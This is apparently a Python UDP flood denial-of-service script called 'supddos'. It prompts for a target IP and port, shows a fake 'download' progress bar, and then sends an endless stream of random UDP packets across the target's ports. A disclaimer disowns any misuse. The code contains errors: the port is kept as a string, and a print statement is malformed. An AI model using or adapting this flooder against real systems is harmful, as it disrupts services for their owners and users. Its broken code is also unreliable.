


print('''
░██████╗██╗░░░██╗██████╗░██████╗░██████╗░░█████╗░░██████╗
██╔════╝██║░░░██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝
╚█████╗░██║░░░██║██████╔╝██║░░██║██║░░██║██║░░██║╚█████╗░
░╚═══██╗██║░░░██║██╔═══╝░██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝╚██████╔╝██║░░░░░██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░░╚═════╝░╚═╝░░░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░''')


print("this tool only works on linux")

input("the creator of this tool is not responsable of the bad use of this tool to continue and accept press enter: ")




import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
print("youtube:https://youtu.be/NQSjonDvSJg ")
print("i am not responsable for the bad use of this tool")
os.system("clear")
os.system("figlet supddos")
print("when de download is complete close the window")
ip = input("enter ip HERE-> : ")
port = input("Port       : ")



os.system("clear")
os.system("figlet starting when download is complete close window")

from tkinter import *
from tkinter.ttk import *
import time

def start():
    GB = 100
    download = 0
    speed = 1.5
    while(download<GB):
        time.sleep(0.05)
        bar['value']+=(speed/GB)*100
        download+=speed
        percent.set(str(int((download/GB)*100))+"%")
        text.set(str(download)+"/"+str(GB)+" your download is done you can close this ")
        window.update_idletasks()

window = Tk()

percent = StringVar()
text = StringVar()

bar = Progressbar(window,orient=HORIZONTAL,length=300)
bar.pack(pady=10)

percentLabel = Label(window,textvariable=percent).pack()
taskLabel = Label(window,textvariable=text).pack()

button = Button(window,text="download",command=start).pack()

window.mainloop()


sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
     if port == 65534:
       port = 1